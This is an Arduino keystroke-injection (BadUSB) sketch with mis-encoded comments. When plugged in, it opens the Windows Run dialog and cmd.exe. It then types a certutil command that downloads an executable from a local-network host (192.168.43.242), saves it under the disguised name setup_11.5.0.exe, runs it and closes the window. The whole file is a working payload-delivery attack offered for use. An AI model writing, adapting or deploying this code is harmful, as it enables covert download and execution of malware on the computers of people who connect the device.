#include<Keyboard.h>
void setup()
{
  Keyboard.begin();//��ʼ����ͨ��
  delay(4000);//��ʱ1000���룬��Ҫ̫�̣���Ϊÿ����Ե������ٶȶ���һ��
  Keyboard.press(KEY_CAPS_LOCK); //���´�д�� ���������������д ��Ȼ������������������������¾ͻ��������
  Keyboard.release(KEY_CAPS_LOCK); //�ͷŴ�д��
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);//���»ձ�� Ҳ����win��
  delay(500);
  Keyboard.press('r');//����r��
  delay(500);
  Keyboard.println("cmd.exe");
  delay(1000);
  Keyboard.println("certutil -urlcache -split -f http://192.168.43.242/wwy.exe D:\\setup_11.5.0.exe");
  delay(1000);
  delay(1000);
  Keyboard.println("D:\\SETUP_11.5.0.EXE");
  delay(500);
  Keyboard.println("exit");
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK); //���´�д��
  Keyboard.release(KEY_CAPS_LOCK); //�ͷŴ�д�� �����ٴιرտ����Ĵ�д��
  delay(400);
  Keyboard.end();//��������ͨѶ

}
void loop()
{
}